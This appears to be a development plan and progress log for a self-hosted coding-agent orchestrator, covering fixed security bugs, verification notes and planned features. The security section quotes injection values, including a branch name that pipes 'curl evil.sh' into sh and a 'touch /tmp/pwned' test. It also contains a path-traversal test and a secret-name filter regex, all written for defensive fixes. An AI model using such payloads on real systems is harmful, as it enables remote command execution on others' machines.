(10) F35. Update this table as each lands; tag `v0.3.0` when the wave
closes (the standing wave-boundary tagging rule from Part 4).

**Batch 1 (B25–B27, PR #79) — done.** All three verified with more than
typecheck/build: B26 against a real in-memory SQLite DB via the actual
`repo.ts` functions (a pending approval seeded older than 250 newer
responded notifications still surfaces at both the default limit and a
small one, with no duplicate when the pending row is already in-window);
B27 by faking `systemctl` in `PATH` to reproduce the exact old-systemd
"exits 0 with zero matches" quirk the fix targets, confirming the new
output-based check falls through to the manual-restart path instead of
firing `sudo systemctl restart` against a nonexistent unit (also checked
the real-match and no-systemctl-at-all cases). Full evidence in the PR
description.

**T1 (PR #80) — done.** New `@orc/server` test script (`node --import
tsx --test`, same runner engine/adapters already use) wired into CI;
35 new tests across `scheduler.test.ts` (13, F19/A3's isScheduleDue
cases), `budget.test.ts` (7, F16's checkModelQuota window math),
`db/backup.test.ts` (3, F17's three runBackup scenarios against real
files on disk), `db/repo.test.ts` (8, B23's pruneNotifications
pending-approval exemption + B26's getNotifications fix), and
`log-redact.test.ts` (4, S7's redactTokenFromUrl — extracted out of
index.ts into its own module so it's importable without booting the
server via index.ts's top-level `main()` call).

**F27+F28 — done.** New `@fastify/multipart` (9.x line, confirmed
compatible with this repo's `fastify@^5.1.0` via a real build) backs
three new routes (`GET`/`POST`/`DELETE .../plan/attachments`,
`packages/server/src/attachments.ts`) storing uploads at
`context/attachments/<name>` in the project's clone — S-item-grade
validation (basename-only, `[A-Za-z0-9._-]` charset, extension
allowlist, 25MB cap, `-2`/`-3`… collision suffixing, containment
double-checked independent of the sanitizer). `buildChatPrompt`/
`buildDeconstructPrompt` (planner.ts) gain an "Attached context files"
block naming them for the planner's own file tools; empty when there
are none. F28's `plan-sessions.ts` archives every planning session as
`context/plan-sessions/<YYYY-MM-DD-HHmm>.md` (new `planning_session_file`
DB column), rewritten wholesale on each chat/deconstruct turn and
finalized with a `## Committed` line at commit (which also clears the
field so the next chat mints a genuinely new file) — minting dedupes
against the directory (`-2` suffix) since two sessions can land in the
same clock-minute, a real collision a first-draft version of this code
had and a test caught. `ENV.mock` roots both attachments and session
files in a scratch tmp dir (shared `context-dir.ts` helper) instead of
the seed project's real `localPath: "."`, so `npm run mock` stays
exercisable without dirtying this repo. PlanView.tsx: an attach button
+ chips (seeded from `GET` on mount, survive reload) above the chat
composer; a new `apiUpload()` in `client.ts` mirrors `api()`'s
auth/401-retry handling with a `FormData` body instead of JSON.
Verified: typecheck/build green across every workspace; `npm test -w
@orc/engine` (32/32) and `-w @orc/adapters` (4/4) unaffected; `npm test
-w @orc/server` 67/67 (16 new: 10 for the attachments module's pure
storage-safety logic, 6 for plan-sessions' mint/rewrite/collision/
read-only-directory behavior — all against real fs, no mocks).
**Live-verified end-to-end against a real (non-mock) built server**
with a throwaway local git repo (`git init` + a matching `origin`
remote — satisfies `ensureClone`'s fast path with no real GitHub repo
or network needed) standing in for a project: uploaded a real file via
curl multipart, confirmed it landed correctly sanitized on disk; a
`../../evil.png` traversal attempt landed as `evil.png` *inside*
`context/attachments/`, not outside it; a disallowed extension and an
oversized file both correctly rejected (400/413); deleted it and
confirmed a 404 on a second delete. Then the one genuinely
un-unit-testable claim: **a real `claude -p` chat call** with a
`context/attachments/notes.txt` file reading "The secret ingredient is
basil." — asked "what's the secret ingredient," got back exactly
`"Basil"`, proving the planner actually read the file with its own
tools rather than guessing. A second real turn confirmed the *same*
session file gets rewritten (not a new one) and now contains both
turns. Total live-verification cost: ~$0.24.

**F31 — done.** New `Settings.guidelines?: { coding?, ux?, security? }`
(`@orc/types`), shipped with real ~15-line-each defaults in
`defaultSettings()`; capped at 4000 chars per field on
`PUT /api/settings`. The actual rendering logic
(`buildEngineeringStandardsBlock`) lives in a new shared
`packages/engine/src/guidelines.ts` — not in either `orchestrator.ts`
or `validator.ts` — specifically so neither has to import from the
other; both call it with the same guidelines and their own
`task.role === "frontend"` check, so the author is told the standards
up front and the validator grades against the *exact same text*. The
validator's prompt gets one extra instruction sentence (flag clear
violations, lean `request_changes` for substantive ones, don't nitpick
unmentioned style) — only present when there's actually a standards
block to reference. Settings.tsx gained a "Guidelines" section (three
labeled textareas) using U4's existing dirty/save machinery unchanged.
Per-project overrides deliberately out of scope (global only, per the
plan). Verified: typecheck/build green across every workspace;
`npm test -w @orc/adapters` (4/4) unaffected; `npm test -w @orc/engine`
**42/42 (10 new)** — `guidelines.test.ts` (6, the pure block-renderer:
undefined/blank guidelines produce nothing, ux excluded when
`includeUx` is false, only configured fields appear, text is trimmed)
plus real dispatch-level integration tests in `orchestrator.test.ts`
and a new `validator.test.ts` (2 each) that capture the actual prompt
handed to a fake adapter for a frontend vs. non-frontend task, proving
the wiring — not just the pure function — behaves correctly; `npm test
-w @orc/server` unaffected (51/51, no server-side unit tests needed —
the cap validation is a simple inline check, live-verified instead).
**Live-verified against a real (non-mock) built server**: a fresh DB's
`GET /api/settings` already shows the shipped defaults for all three
fields; a 4001-char `guidelines.coding` → 400 with a clear message; a
valid edit round-trips and persists across a fresh GET. Then in a real
browser (`agent-browser`) against that same server: the Guidelines
section renders between Risky Change Rules and Projects with all three
textareas populated (screenshotted); editing a field flips the Save
button from disabled to enabled (proving the dirty-tracking wiring);
saving shows "Settings saved.", re-disables Save, and the edit was
independently confirmed via a follow-up curl GET.

**F29 — done.** New `DOCS_GUIDELINES` const in `packages/engine/src/
guidelines.ts` (README/CHANGELOG/helper-docs standards from the plan) —
a fixed engine constant, not an operator-editable Settings field, per
the plan's own reasoning (three textareas is already enough surface).
`buildEngineeringStandardsBlock` gained a third `includeDocs` parameter
(default `false`, so every existing call site and test stayed
backward-compatible unchanged); both `orchestrator.ts`'s author prompt
and `validator.ts`'s review prompt now pass `task.role === "docs"` for
it, alongside the existing frontend/ux wiring — a docs task's prompt
gets coding + security + docs, matching the plan's explicit note that
this is correct (docs tasks still touch the repo). `buildDocsTaskDraft`
(the standing "Project documentation" task every project gets) now
also demands a CHANGELOG.md and references the quickstart-commands-
must-be-real rule in both its description and acceptance criteria;
`scopePaths` extended to include `CHANGELOG.md`. Verified: typecheck/
build green across every workspace; `npm test -w @orc/adapters` (4/4)
and `-w @orc/server` (51/51) unaffected; `npm test -w @orc/engine`
**48/48 (6 new)** — 4 new cases in `guidelines.test.ts` (docs section
excluded by default, included when `includeDocs` is true, appears even
with zero `Settings.guidelines` configured since `DOCS_GUIDELINES` is
fixed, and the constant's own content covers README/CHANGELOG/
package.json) plus one integration test each in `orchestrator.test.ts`
and `validator.test.ts` capturing the real prompt for a docs-role task
vs. a frontend task. **Live-verified with a real, full pipeline** — not
just a planner chat call like F27/F28's verification, but the actual
author → gates → validator → merge loop: created a real private GitHub
repo via the app's own `createRepo: true` path, materialized a single
real docs-role task via `POST .../tasks` (correctly auto-routed to
`grok` per `routing.byRole.docs`), started the project, and let it run
for real. The validator (claude) approved with reasons that explicitly
cite the guidelines — *"README.md and CHANGELOG.md both exist and
accurately reflect the actual package.json… No fabricated commands,
badges, or feature claims; the README correctly states there are no
runnable scripts rather than inventing ones"* — proving the standard
was genuinely applied, not just present in the prompt. B11's vacuous-
gate rail correctly caught this scratch repo's absent test/lint
scripts and required approval before merging (expected, unrelated to
F29); approved it after eyeballing the actual PR diff via `gh pr diff`
— the README honestly stated "no scripts defined... so there are no
commands to run" instead of inventing any, and CHANGELOG.md followed
Keep-a-Changelog format exactly (`## [0.0.0] - date`, `### Added`).
Task ended `done`, PR genuinely merged on GitHub. Total live-
verification cost: ~$0.19. One cleanup note: the throwaway GitHub repo
(`IngeniousArtist/f29-livetest`) could not be deleted afterward — the
`gh` CLI token on this box lacks the `delete_repo` scope, and granting
it wasn't something to do unilaterally; it's a harmless empty private
repo, delete manually or extend the token's scope
(`gh auth refresh -s delete_repo`) if you want it gone. Next up: F30.

---

## Part 1 — Bugs & security (fix first, in this order)

### S1. Command injection via `execSync` string interpolation — CRITICAL — ✅ DONE (PR [#3](https://github.com/IngeniousArtist/hoopedorc/pull/3))

**Where:** `packages/engine/src/worktree-manager.ts` (7 call sites: lines ~40, 54, 69,
82, 87, 95, 213, 222, 240) and `packages/engine/src/validator.ts` (`getDiff`, ~line 107).

**Problem:** These build shell strings by interpolating `project.defaultBranch`,
`project.localPath`-derived paths, and branch names into `execSync("git … \"${x}\"")`.
`defaultBranch` and `localPath` are **user-controlled via the HTTP API**
(`POST /api/projects`, `PATCH /api/projects/:id`). Inside double quotes, `sh` still
performs `$(…)` command substitution, so a defaultBranch like
`main" $(curl evil.sh | sh) "` executes arbitrary commands. Combined with S2 (the API
is unauthenticated and CORS-open), this is a drive-by remote-command-execution vector.
Note `git-service.ts` already does this correctly with `execFile` + arg arrays — the
worktree manager and validator were never converted.

**Fix:**
1. Convert every `execSync` in `worktree-manager.ts` and `validator.ts` to
   `promisify(execFile)("git", [args…], { cwd })` — argument arrays, no shell. This
   also fixes the event-loop blocking (these sync calls freeze the server during
   fetch/worktree-add/diff; the codebase already migrated `git-service.ts` and
   `gate-runner.ts` for exactly this reason). `create()`, `remove()`, `changedFiles()`
   are already `async` so signatures don't change; `ValidatorImpl.getDiff` becomes
   async (await it in `review()`).
2. Belt-and-braces input validation in `packages/server/src/index.ts`:
   - `defaultBranch` must match `^[A-Za-z0-9._/-]+$` and must not start with `-`
     (reject with 400 otherwise) in both `POST /api/projects` and `PATCH`.
   - Reject any `repoUrl` that doesn't parse as `https://github.com/<owner>/<repo>`
     or `git@github.com:<owner>/<repo>` (it's passed to `gh --repo` and `git clone`;
     also prevents `-` flag-injection into git/gh).

**Acceptance:** grep shows zero `execSync(` under `packages/engine/`; creating a
project with `defaultBranch: 'main"; touch /tmp/pwned; "'` returns 400; typecheck,
build, engine tests green.

### S2. Unauthenticated API bound to 0.0.0.0 with reflect-any-origin CORS — CRITICAL — ✅ DONE (PR [#4](https://github.com/IngeniousArtist/hoopedorc/pull/4))

**Where:** `packages/server/src/index.ts` — `app.register(cors, { origin: true })`
(line ~243) and `app.listen({ port: ENV.port, host: "0.0.0.0" })` (line ~1290).

**Problem:** Anyone on the LAN — and, because CORS reflects every origin, **any
website open in the operator's browser** — can call every endpoint: read settings
(including the raw Telegram bot token, see S3), create/delete projects (which runs
`rm -rf` on disk, see S4), change merge policy to `fully_autonomous`, resolve
approvals, and start runs that spend real money and push code to GitHub. The
Tailscale-only deployment note in NEXT_STEPS doesn't protect a laptop on café wifi,
and CORS `origin: true` defeats even localhost-only binding.

**Fix (all three):**
1. **Bind host configurable, default loopback:** `ENV.host = process.env.HOST ?? "127.0.0.1"`
   in `config.ts`; use it in `app.listen`. Document `HOST=0.0.0.0` for tailnet/EC2 use.
2. **CORS allowlist:** default to the dev web origin(s)
   (`http://localhost:5173`, `http://127.0.0.1:5173`) plus an optional
   `ENV.corsOrigins` (comma-separated env `CORS_ORIGINS`). Never `origin: true`.
   (When the server later serves the built web app itself — F10 — same-origin makes
   CORS moot in production.)
3. **Optional bearer-token auth:** if `API_TOKEN` env (or a new
   `settings.apiToken`) is set, add a Fastify `onRequest` hook requiring
   `Authorization: Bearer <token>` on all `/api/*` routes except `/api/health`, and
   the same token as a `?token=` query param on the `/ws` upgrade. The web app reads
   the token from a login prompt stored in `localStorage` and sends it via
   `apps/web/src/api/client.ts` (add a header) and the `useWS` URL. Off by default
   (solo localhost use stays frictionless); required for any non-loopback HOST —
   refuse to start with `HOST != 127.0.0.1` unless a token is set or
   `ALLOW_UNAUTHENTICATED=1`.

**Acceptance:** server on defaults refuses connections from another machine; a fetch
from a random origin in the browser gets a CORS error; with `API_TOKEN` set, requests
without the header get 401, the web UI still works after entering the token.

### S3. Telegram bot token stored and served in plaintext — HIGH — ✅ DONE (PR [#5](https://github.com/IngeniousArtist/hoopedorc/pull/5))

**Where:** `settings.telegram.botToken` is saved raw in the settings JSON
(`repo.upsertSettings`) and returned verbatim by `GET /api/settings`; the Settings
page round-trips it (`apps/web/src/pages/Settings.tsx` lines ~470, 184). Whoever can
read the API (see S2) owns the bot — and the bot can approve risky merges.

**Fix:** Redact on read, write-only on save:
- In `GET /api/settings`, replace a present `botToken` with the literal
  `"__SET__"` sentinel (never the value).
- In `PUT /api/settings`, if the incoming `telegram.botToken` is `"__SET__"` or
  empty-and-previously-set, keep the stored value; otherwise overwrite.
- Settings UI: show a password field with placeholder "token saved — enter to
  replace", and stop echoing the token back into the input value.
- Same treatment for any future secret (`apiToken` from S2 item 3).
- Update the stale comment block at the top of `telegram.ts` (it still claims the
  token is "never stored raw" — it is, since the botToken field was added).

**Acceptance:** `curl /api/settings` never contains the real token; saving settings
without touching the token field leaves Telegram working; entering a new token
replaces it.

### S4. `rm -rf` on an arbitrary user-supplied path — HIGH — ✅ DONE (PR [#6](https://github.com/IngeniousArtist/hoopedorc/pull/6))

**Where:** `POST /api/projects` accepts `body.localPath` (any absolute path, `~`
expanded); `DELETE /api/projects/:id` then does
`rmSync(project.localPath, { recursive: true, force: true })` plus a sibling
`-wt-*` sweep (`index.ts` ~502–535). Creating a project with `localPath: "~"` and
deleting it wipes the home directory.

**Fix:**
1. On create: resolve and normalize the path; reject (400) if it is `/`, the home
   dir itself, not absolute after expansion, or contains `..`; reject if it is an
   ancestor of (or equal to) the server's CWD or `ENV.reposDir`. Require the path
   either not to exist yet or to be an empty directory or an existing clone whose
   `origin` matches `repoUrl` (a cheap `git remote get-url origin` check).
2. On delete: refuse the `rmSync` (skip cleanup, log a warning, still delete the DB
   rows) unless the directory contains a `.git` whose `origin` URL matches the
   project's `repoUrl`. Depth guard: also require `path.length > homedir().length + 1`.

**Acceptance:** creating a project with `localPath: "~"` or `"/"` returns 400;
deleting a project whose localPath was hand-edited to a non-clone directory leaves
the directory intact and logs a warning.

### S5. Spawned agents inherit the full server environment — MEDIUM

**Where:** both adapters (`packages/adapters/src/index.ts`) spawn `claude`/`opencode`
with `env: { ...process.env, PWD: opts.cwd }`; gate scripts (`gate-runner.ts`) and
`npm ci` (`worktree-manager.ts ensureDeps`) do the same. The server's env typically
holds `TELEGRAM_BOT_TOKEN` and any provider API keys from `.env` — and Claude runs
with `--permission-mode bypassPermissions`, so a prompt-injected or simply confused
agent (or any repo's `npm test` script — gates execute repo-controlled code by
design) can read and exfiltrate them.

**Fix:** build one `sanitizedEnv()` helper (new file `packages/adapters/src/env.ts`,
reused by engine via a copy or by passing env in `AgentRunOptions`): start from
`process.env`, delete keys matching
`/TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|TELEGRAM/i` except an allowlist the CLIs need
(`PATH`, `HOME`, `SHELL`, `TMPDIR`, `LANG`, `LC_*`, `NODE_*`, `npm_config_*`, plus
`ANTHROPIC_*` if present since Claude Code may need it). Use it for both adapters,
gate scripts, and `ensureDeps`. Document in README that gate scripts execute
repo-controlled code on the host, and that a container/sandbox mode is future work
(F13).

**Acceptance:** a task whose author prompt asks the model to `echo $TELEGRAM_BOT_TOKEN`
gets an empty value; agents and gates still run (verified by the seed-e2e harness).

### B1. "Stop" doesn't stop anything — the agent keeps running and spending — HIGH — ✅ DONE (PR [#8](https://github.com/IngeniousArtist/hoopedorc/pull/8))

**Where:** `POST /api/tasks/:id/stop` (`index.ts` ~906) only rewrites DB rows (run →
`stopped`, task → `blocked`). The actual child process lives in the Orchestrator's
`taskAbortControllers`, which the route never reaches. Worse, when the agent
finishes anyway, the pipeline continues (gates → validator → possibly **auto-merge**)
and overwrites the task status — the user pressed Stop and the PR merged anyway.

**Fix:**
1. `Orchestrator`: add `stopTask(taskId: string): boolean` — aborts the task's
   controller if present, marks the task id in a `stopRequested: Set<string>`, and
   `executeTask` checks that set at each stage boundary (after author run, after
   gates, before validator, before merge) and returns early with status `blocked`
   (emit a log line "stopped by user"). Clear the set entry in the `finally`.
2. `EngineRunner`: add `stopTask(projectId, taskId)` that forwards to the project's
   orchestrator (also look through the one-off orchestrators created by
   `dispatchOne` — see B3, which makes those tracked).
3. Route calls `engine.stopTask(...)` first; keep the DB writes as the fallback for
   when nothing is actually running. Also write an audit entry (`kind: "stopped"`,
   actor human).

**Acceptance:** dispatch a long task, hit Stop → the `claude`/`opencode` process is
gone within ~3s (SIGTERM→SIGKILL path already exists in `wireAbort`), the task ends
`blocked`, and nothing merges afterwards.

### B2. Run log history is unreadable after reload — every log row has `runId: ""` — HIGH — ✅ DONE (PR [#9](https://github.com/IngeniousArtist/hoopedorc/pull/9))

**Where:** every `onLog` emission in `orchestrator.ts` (lines ~522, 760, 811) and
`validator.ts` (~193) hardcodes `runId: ""`. The Board's history loader
(`Board.tsx` ~93–120) fetches runs, then `GET /api/runs/:id/logs` per run — which
matches nothing, so after a page reload the log panel is always empty; only live WS
logs ever show. The `runLogs` endpoint is effectively dead.

**Fix (choose the task-scoped route — simpler and matches how the UI thinks):**
1. Add `GET /api/tasks/:id/logs` (new `repo.getLogsByTask(db, taskId)`, indexed by
   the existing `task_id` column; add `LIMIT`/`?after=` paging — default last 1000).
   Register it in `ROUTES` in `@orc/types` and CONTRACT.md.
2. Board: replace the per-run log fan-out with one `taskLogs` call.
3. Keep writing `runId` properly anyway for future use: `executeTask` knows the
   attempt number, so pass `run-${task.id}-${task.attempts}` into the `onLog`
   payloads instead of `""` where a run exists (engine-level logs before the first
   attempt may keep `""`).

**Acceptance:** run a task, reload the page, select the task → historical logs appear.

### B3. Manual dispatch and the autonomous loop can double-run the same task — HIGH — ✅ DONE (PR [#10](https://github.com/IngeniousArtist/hoopedorc/pull/10))

**Where:** `EngineRunner.dispatchOne` builds a throwaway `Orchestrator` that is
**not** registered in `this.orchestrators`, so `engine.isRunning(projectId)` is
false while it runs. The `/dispatch` and `/retry` routes correctly refuse when the
autonomous loop is running — but the reverse is unguarded: pressing **Start** while
a manual dispatch is in flight boots the autonomous loop, whose orphan recovery sees
the task `in_progress` with no active run *in its own memory* and requeues it →
two agents on the same task, same branch name `orc/<taskId>`, same worktree path →
push rejections and interleaved commits.

**Fix:** track manual dispatches: keep a `Map<projectId, Set<taskId>> manualRuns` in
`EngineRunner`; `dispatchOne` registers/unregisters in a `finally`. `start()` returns
a 409-style error (throw; route surfaces it) if `manualRuns.get(project.id)?.size`.
Also expose the one-off orchestrator to `stopTask` (B1) via this map (store the
orchestrator instance, not just the task id).

**Acceptance:** while a manual dispatch runs, `POST /projects/:id/start` returns 409
with a clear message; after it finishes, start works.

### B4. Run rows are only written when a run *ends* — no live run, wrong duration — MEDIUM — ✅ DONE (PR [#11](https://github.com/IngeniousArtist/hoopedorc/pull/11))

**Where:** `Orchestrator.emitRunEvent` (orchestrator.ts ~820) is called once, after
the adapter returns, with `startedAt` = `endedAt` = now. So while an agent works
there is **no run row** (the `/dispatch` route papers over this with a fake
`placeholderRun` it never persists), run durations are always 0, and per-run cost
timing is wrong.

**Fix:** in `runAuthor`, emit a run event with `status: "running"`, real `startedAt`,
zero cost **before** `adapter.run(...)`; keep the terminal emit but preserve the
original `startedAt` (hold it in a local). `EngineRunner.onRunUpdated` already
upserts, so no server change is needed. Delete the `placeholderRun` blocks in
`/dispatch` and `/retry` and return the real run row (`repo.getRuns` after dispatch)
or just `{ task }` — update `@orc/types` responses accordingly and the two callers in
the web app.

**Acceptance:** during a run, `GET /api/tasks/:id/runs` shows a `running` row;
after completion the row's `endedAt - startedAt` matches wall-clock (>0).

### B5. `PATCH /api/tasks/:id` accepts any string as `status` — MEDIUM — ✅ DONE (PR [#12](https://github.com/IngeniousArtist/hoopedorc/pull/12))

**Where:** `index.ts` ~793: `if (body.status) updates.status = body.status` — no
validation against `TaskStatus`, no guard against nonsensical transitions (e.g.
setting a `done` task back to `in_progress` by hand, which orphan recovery will then
requeue and re-run, re-opening merged work).

**Fix:** validate `body.status` against the `TaskStatus` union (export a
`TASK_STATUSES` const array from `@orc/types/domain.ts` and reuse it in the Board's
column list too). Allow only human-meaningful transitions: anything →
`backlog`/`ready` (requeue), `in_progress` → nothing (409 — use Stop), `done` →
nothing (409 — use Rollback/Retry). Return 400 with the allowed set otherwise. Apply
the same enum check to `difficulty`/`role` if you add them to the PATCH body later.

**Acceptance:** `PATCH {status: "bogus"}` → 400; `PATCH {status: "ready"}` on a
failed task works; `PATCH {status: "in_progress"}` → 409.

### B6. `in_review` status exists but is never set — dead kanban column — LOW — ✅ DONE (PR [#14](https://github.com/IngeniousArtist/hoopedorc/pull/14))

**Where:** `domain.ts` defines `in_review` ("gates + validator running"); the
orchestrator never assigns it, so the Board column is permanently empty and the
user can't see which tasks are being validated (a phase that takes minutes).

**Fix:** in `executeTask`, set `task.status = "in_review"` +
`onTaskUpdated` right before the gates run, and back to `in_progress` when a retry
loop iterates (fix instructions path). Orphan recovery (`start()`) must treat
`in_review` like `in_progress` (requeue). `estimate.ts` already counts `in_review`
as pending — good. Check the Stop path (B1) handles `in_review` too.

**Acceptance:** while gates/validator run, the card sits in "In Review"; on a
gate-failure retry it moves back to "In Progress".

### B7. Planner passes the whole conversation as one argv — will hit E2BIG — MEDIUM

**Where:** `planner.ts runClaudeJson` spawns `claude -p <prompt>` with the full chat
transcript + prior-context inlined in a single argument; adapters do the same with
task prompts. macOS caps a single arg ~256KB and total argv ~1MB — a long planning
chat on a project with a fat PRD will start failing with a cryptic spawn error.

**Fix:** write the prompt to stdin instead: `claude -p --output-format json` reads
the prompt from stdin when `-p` is given no value (verify with `claude --help`; if
stdin isn't supported for `-p`, write the prompt to a temp file inside the cwd and
pass `-p "$(instructions to read file)"` — prefer stdin: change
`stdio: ["ignore", …]` to `["pipe", …]` and `proc.stdin.end(prompt)`). Do the same
for both adapters in `packages/adapters/src/index.ts` (`claude` and `opencode run`
both accept the prompt on stdin; for opencode, keep the message as the last CLI arg
only if stdin proves unsupported). Trim `buildPriorContext` task lists to the most
recent ~50 tasks as an extra bound.

**Acceptance:** a planning chat with a 300KB transcript completes; adapters still
pass the existing engine tests and the seed-e2e harness runs.

### B8. Telegram messages with Markdown metacharacters silently fail — LOW — ✅ DONE (PR [#15](https://github.com/IngeniousArtist/hoopedorc/pull/15))

**Where:** `telegram.ts approvalRequested` sends `parse_mode: "Markdown"` with raw
task titles/messages. A title containing `_`, `*`, `[`, or a backtick makes the Bot
API reject the message → the approval never reaches the phone (the code logs and
moves on) → an unattended run stalls waiting for an approval the user never saw.

**Fix:** drop `parse_mode` entirely (plain text is fine for these) or escape
Telegram-Markdown metacharacters. Also have `approvalRequested` fall back to a
plain-text resend (no parse_mode) if the first send returns `ok: false` — `tg()`
currently swallows the error; make it return the error description so callers can
retry.

**Acceptance:** an approval whose title is `fix _foo_ [bar]` arrives on Telegram.

### B9. Tasks added mid-run are invisible to the running orchestrator — MEDIUM

**Where:** `Orchestrator.start` loads `tasks` once and loops over that array;
`plan/commit` on a running project writes new Task rows the loop never sees, and the
run "finishes" without them (they sit in `backlog` until the user manually presses
Start again — which currently they can, since the finished loop deregisters).

**Fix:** give the loop a refresh hook: add `getTasks?: () => Task[]` to
`SchedulerDeps` (`EngineRunner` supplies `() => repo.getTasks(db, project.id)`).
At the top of each `while` iteration, reconcile: append any DB task whose id isn't
in `currentTasks` (and adopt status changes for non-active tasks, replacing the
per-task `fresh` patch that exists today). Keep in-memory state authoritative for
tasks in `activeTaskIds`. This is also the foundation for the "add a task while it
runs" product feature (F3).

**Acceptance:** start a 2-task project, `plan/commit` a third task while the first
runs → the third dispatches without restarting the run.

### B10. Stale unresolved approvals survive restarts as zombie action-required items — LOW

**Where:** `EngineRunner.pendingApprovals` resolvers live in process memory. After a
restart, resume-on-boot re-runs tasks and creates **new** notifications, but the old
`requiresApproval` rows (with no `respondedWith`) remain; the Notifications page and
Telegram show dead Approve/Reject buttons whose `resolveApproval` returns false.

**Fix:** on boot (in `main()` before resume), mark all unresponded
approval-notifications as `respondedWith: "expired_restart"` (new repo helper,
one UPDATE), and have the UI render that as "expired". When
`resolveNotification` can't find a resolver, return an explicit "approval expired —
the task will re-request if still needed" message to the caller (HTTP 410 / Telegram
callback answer) instead of silently succeeding.

**Acceptance:** kill the server while an approval is pending; after restart the old
notification shows "expired" and responding to it returns the explicit message.

### B11. Gates pass vacuously on repos with no scripts — MEDIUM (safety rail gap)

**Where:** `gate-runner.ts runScript` uses `npm run <s> --if-present`, so a repo
with no `typecheck`/`lint`/`build`/`test` scripts passes every gate (exit 0). New
repos created by `createGithubRepo` are seeded with a script-less `package.json` —
i.e. **the default path for brand-new projects has zero objective gates**; only the
validator model stands between generated code and auto-merge.

**Fix (two parts):**
1. Surface it: `GateRunnerImpl.run` already returns per-gate `output` saying
   "unavailable" — add a `vacuous: boolean` to `GateResult.details` (types change)
   when *all four* script gates were missing, and have `canAutoMerge` treat a fully
   vacuous gate result as risky (escalate to approval) unless a new
   `settings.allowVacuousGates` (default false) is on. Show a warning banner on the
   Board when the last gate result was vacuous.
2. Fix the root for new repos: when the planner deconstructs a plan for a brand-new
   repo, the seeded scaffold task should add real `test`/`build` scripts — append a
   standing instruction to `DECONSTRUCT_SHAPE` in `planner.ts`: the first scaffold
   task must set up `package.json` scripts (`test`, `build`, `lint`, `typecheck`)
   appropriate to the stack it chooses, and its acceptance criteria must include
   "npm test runs real tests and passes".

**Acceptance:** a repo with no scripts + `hard_gate_flag_risky` policy → merge
requires approval with reason "no objective gates ran"; engine tests green.

### B12. Risky-file regex flags `author.ts`, `token.ts` etc. — LOW (noise) — ✅ DONE (PR [#16](https://github.com/IngeniousArtist/hoopedorc/pull/16))

**Where:** `orchestrator.ts canAutoMerge`:
`/\.env|auth|secret|credential|token/i.test(f)` matches substrings anywhere in the
path — `src/author.ts`, `docs/authors.md`, `tokenizer.ts` all trip the
"auth/secret change" rail and needlessly demote auto-merges to approvals (alert
fatigue → the user stops reading approvals).

**Fix:** match path *segments*, not substrings:
`/(^|\/)\.env(\.|$)|(^|\/)(auth|secrets?|credentials?|tokens?)(\/|\.|$)/i` — and add
unit tests in the engine test file for `author.ts` (no), `auth.ts` (yes),
`src/auth/login.ts` (yes), `tokenizer.ts` (no), `.env.local` (yes).

**Acceptance:** new unit tests pass; the four existing engine tests stay green.

### B13. `scopesOverlap` mishandles glob patterns — LOW — ✅ DONE (PR [#17](https://github.com/IngeniousArtist/hoopedorc/pull/17))

**Where:** `orchestrator.ts scopesOverlap` only strips a trailing `/**`; patterns
like `src/**/*.ts`, `**/*`, `*.md` fall through to literal string compares, so
tasks scoped `["**/*"]` (the planner's fallback and the stub tasks) are treated as
never overlapping anything — the serialization rail silently off for exactly the
least-scoped (riskiest) tasks.

**Fix:** normalize each pattern to its static prefix (everything before the first
glob char: `src/**/*.ts` → `src`, `**/*` → `""`), then apply the existing
prefix-overlap logic, where an empty prefix overlaps everything. Add engine unit
tests: `["**/*"]` vs anything → true; `["src/**/*.ts"]` vs `["src/utils/**"]` →
true; `["docs/**"]` vs `["src/**"]` → false.

**Acceptance:** new tests pass; a plan with two `**/*` tasks runs them serially.

### B14. Unbounded `logs` table growth — LOW — ✅ DONE (PR [#18](https://github.com/IngeniousArtist/hoopedorc/pull/18))

**Where:** every agent output line is persisted forever (`logs` table); a few long
runs → hundreds of MB in SQLite, slowing the WAL and snapshot queries.

**Fix:** prune on boot and daily (`setInterval` in `main()`): delete logs older
than `LOG_RETENTION_DAYS` (env, default 14) **and** keep at most the newest ~2000
rows per task (`DELETE FROM logs WHERE task_id = ? AND id NOT IN (SELECT id … ORDER
BY ts DESC LIMIT 2000)` per task with more). Add an index on `logs(task_id, ts)` in
`schema.sql` (B2 relies on it too).

**Acceptance:** boot with an old fat DB → row count drops; task log view (B2) still
shows recent history.

### B15. WS broadcasts every project's events to every client — LOW

**Where:** `ws-hub.ts broadcast` ignores `client.projectId`; subscription only
scopes the snapshot. With several projects running, every browser tab processes
every log line of every project (the Board filters client-side by taskId, so it's
waste + a subtle cross-project log-bleed in the LogPanel if task ids ever collide).

**Fix:** carry a `projectId` on `ServerEvent` payloads where missing (log events
need one — thread it through `EngineRunner.enqueueLog`; task/run/project events
already imply it) and have `broadcast` skip clients subscribed to a different
project (clients with no subscription get project-level events only:
`project.updated/deleted`). Keep `notification` events global (they're the "needs
you" channel).

**Acceptance:** two projects running, two tabs each subscribed to one → each tab's
WS frames only contain its own project's logs.

---

## Part 2 — Productization features (build after Part 1)

Vision reminder (from the user): not a SaaS — a robust self-hosted app for
developers who, like the owner, hold several model subscriptions and want to run a
team of coding agents in parallel: plan in chat, watch a kanban, let it run
autonomously, get pinged remotely, and step in mid-run without breaking things.

### F1. First-run onboarding wizard (highest product impact)

Today a new user lands on an empty Board with 9 nav tabs and no guidance. Turn the
existing SetupView into a guided first-run flow:

- On load, if there are no projects **and** setup has never completed, route to a
  `Welcome` page: step 1 shows the three CLI checks (`/api/setup`, already built)
  with fix-it hints per failure (install command, login command, copy-paste ready);
  step 2 model roster — read the user's actual `opencode models` output (new
  endpoint `GET /api/setup/models` shelling `opencode models`) and let them
  enable/disable + map the roster instead of hand-editing IDs blind; step 3 routing
  defaults with a one-line explanation of difficulty tiers and the
  author-vs-validator rule; step 4 (optional) budgets + Telegram; step 5 "Create
  your first project" → existing NewProject.
- Persist `settings.onboardedAt`. Add "Re-run setup" link on SetupView.
- Files: new `apps/web/src/pages/Welcome.tsx`, `App.tsx` routing, `setup.ts`
  (+models endpoint), types.

### F2. Task detail drawer (make the black box explainable)

The Board's selected-task strip is cramped and hides the decision trail. Add a
right-side drawer (click a card) with tabs:

- **Overview**: description, acceptance criteria (checkable display), scope paths,
  model + fallback chain, attempts timeline (one row per run: model, duration —
  needs B4 — cost, exit reason).
- **Logs**: the existing live log panel + history (needs B2), with source filter
  (engine/agent/gate/validator) and auto-follow toggle.
- **Review**: latest `GateResult` as pass/fail chips with expandable output,
  validator verdicts with reasons + confidence (from `merge_decisions` — add
  `GET /api/tasks/:id/decisions`, repo fn exists).
